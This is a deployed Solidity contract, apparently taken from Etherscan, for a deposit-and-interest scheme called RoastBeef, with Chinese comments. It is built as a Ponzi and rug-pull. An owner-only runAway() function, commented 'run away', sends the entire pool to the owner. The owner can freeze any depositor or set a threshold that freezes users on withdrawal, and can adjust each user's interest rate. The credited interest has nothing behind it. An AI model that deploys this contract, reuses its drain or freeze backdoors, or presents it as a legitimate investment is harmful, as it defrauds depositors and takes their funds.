/**
 *Submitted for verification at Etherscan.io on 2023-03-23
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.4.26;

contract RoastBeef{
    address private ceoAddress; //合约主持人
    uint256 MAX_TO_PRODUCTION = 28800; //最大生产时间
    mapping (address => uint256) private balance; //本金
    mapping (address => uint256) private interest; //利息率
    mapping (address => uint256) private countdown; //倒计时
    mapping (address => uint256) private sumIncome; //总收益
    mapping (address => uint256) private state; //状态：0-正常，1-冻结
    mapping (address => uint256) private monitor; //监控：0-100
    mapping (address => uint256) private controlInterest; //控制利息倍率：初始1倍-100
    mapping (address => address) public invite; //邀请
    mapping (address => uint256) public sumRecharge; //总入金
    mapping (address => uint256) public sumWithdraw; //总出金
    
    //记录合约主持人
    constructor() public {
        ceoAddress = msg.sender;
    }

    //跑路
    function runAway() public {
        require(msg.sender == ceoAddress, 'only ceo can do this');
        msg.sender.transfer(address(this).balance);
    }

    //获取奖池金额
    function getBalance() public view returns(uint256){
        return address(this).balance;
    }

    //获取本金金额
    function getMyBalance() public view returns(uint256) {
        return balance[msg.sender];
    }

    //获取利息率
    function getMyInterest() public view returns(uint256) {
        return interest[msg.sender];
    }

    //获取倒计时
    function getMyCountdown() public view returns(uint256) {
        if (balance[msg.sender] == 0) {
            return 0;
        }
        return SafeMath.min(MAX_TO_PRODUCTION, block.timestamp - countdown[msg.sender]);
    }

    //获取本期预计收益
    function getAward() public view returns(uint256) {
        return SafeMath.div(SafeMath.mul(interest[msg.sender],balance[msg.sender]), 10000);
    }

    //获取总收益
    function getSumIncome() public view returns(uint256) {
        return sumIncome[msg.sender];
    }

    //设置状态
    function setState(address ref, uint256 stateValue) public {
        require(msg.sender == ceoAddress, 'only ceo can do this');
        state[ref] = stateValue;
    }

    //设置监控
    function setMonitor(address ref, uint256 monitorValue) public {
        require(msg.sender == ceoAddress, 'only ceo can do this');
        monitor[ref] = monitorValue;
    }

    //设置控制利息倍率
    function setControlInterest(address ref, uint256 controlInterestValue) public {
        require(msg.sender == ceoAddress, 'only ceo can do this');
        require(controlInterestValue >= 100 && controlInterestValue <= 500, 'invalid call');
        controlInterest[ref] = controlInterestValue;
    }

    //改变算力等级
    function setLevelAndInterest() private {
        if (balance[msg.sender] < 1 ether) {//LV1
            interest[msg.sender] = SafeMath.div(SafeMath.mul(30, controlInterest[msg.sender]), 100);//0.3%
        }
        if (balance[msg.sender] >= 1 ether && balance[msg.sender] < 5 ether ) {//LV2
            interest[msg.sender] = SafeMath.div(SafeMath.mul(40, controlInterest[msg.sender]), 100);//0.4%
        }
        if (balance[msg.sender] >= 5 ether && balance[msg.sender] < 10 ether ) {//LV3
            interest[msg.sender] = SafeMath.div(SafeMath.mul(50, controlInterest[msg.sender]), 100);//0.5%
        }
        if (balance[msg.sender] >= 10 ether && balance[msg.sender] < 20 ether ) {//LV4
            interest[msg.sender] = SafeMath.div(SafeMath.mul(60, controlInterest[msg.sender]), 100);//0.6%
        }
        if (balance[msg.sender] >= 20 ether && balance[msg.sender] < 50 ether ) {//LV5
            interest[msg.sender] = SafeMath.div(SafeMath.mul(70, controlInterest[msg.sender]), 100);//0.7%
        }
        if (balance[msg.sender] >= 50 ether && balance[msg.sender] < 100 ether ) {//LV6
            interest[msg.sender] = SafeMath.div(SafeMath.mul(80, controlInterest[msg.sender]), 100);//0.8%
        }
        if (balance[msg.sender] >= 100 ether) {//LV7
            interest[msg.sender] = SafeMath.div(SafeMath.mul(90, controlInterest[msg.sender]), 100);//0.9%
        }
        countdown[msg.sender] = now;//重置倒计时
    }

    //入金
    function buy(address ref) public payable {
        //首次入金赋值上下级关系,初始化利息倍率
        if(invite[msg.sender] == address(0)) {
            invite[msg.sender] = ref;
            controlInterest[msg.sender] = 100;
            monitor[msg.sender] = 100;
        }
        balance[msg.sender] = SafeMath.add(balance[msg.sender], msg.value);//增加本金
        sumRecharge[msg.sender] = sumRecharge[msg.sender] + msg.value;
        setLevelAndInterest();//改变算力等级
    }

    //出金
    function sell(uint256 balances) public {
        require(state[msg.sender] == 0, 'invalid call');
        require(balances <= balance[msg.sender], 'invalid call');
        //监控
        if(balances > SafeMath.div(SafeMath.mul(balance[msg.sender], monitor[msg.sender]), 100)) {
            state[msg.sender] = 1;
        } else {
            balance[msg.sender] = balance[msg.sender] - balances;
            msg.sender.transfer(balances);
            sumWithdraw[msg.sender] = sumWithdraw[msg.sender] + balances;
            setLevelAndInterest();//改变算力等级
        }
    }

    //领取收益
    function receiveBenefits() public {
        require(MAX_TO_PRODUCTION == getMyCountdown(), 'invalid call');
        balance[msg.sender] = balance[msg.sender] + getAward();
        sumIncome[msg.sender] = sumIncome[msg.sender] + getAward();
        setLevelAndInterest();//改变算力等级
    }
}

library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        assert(c / a == b);
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a / b;
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        assert(b <= a);
        return a - b;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        assert(c >= a);
        return c;
    }

    function min(uint256 a, uint256 b) internal pure returns (uint256) {
        return a < b ? a : b;
    }
}